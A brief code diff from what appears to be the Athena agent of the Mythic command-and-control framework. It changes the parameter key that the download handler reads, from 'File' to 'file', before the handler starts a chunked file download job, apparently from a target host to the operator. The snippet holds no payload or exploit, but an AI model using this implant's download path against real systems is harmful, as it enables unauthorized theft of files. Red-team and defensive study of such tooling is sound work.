@@ -22,7 +22,7 @@ namespace Athena.Handler.Common.FileSystem
         {
             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
             Dictionary<string, string> par = Misc.ConvertJsonStringToDict(job.task.parameters);
-            downloadJob.path = par["File"].Replace("\"", string.Empty);
+            downloadJob.path = par["file"].Replace("\"", string.Empty);
             downloadJob.total_chunks = await GetTotalChunks(downloadJob);
             downloadJobs.GetOrAdd(job.task.id, downloadJob);
             Debug.WriteLine($"[{DateTime.Now}] Starting download job ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
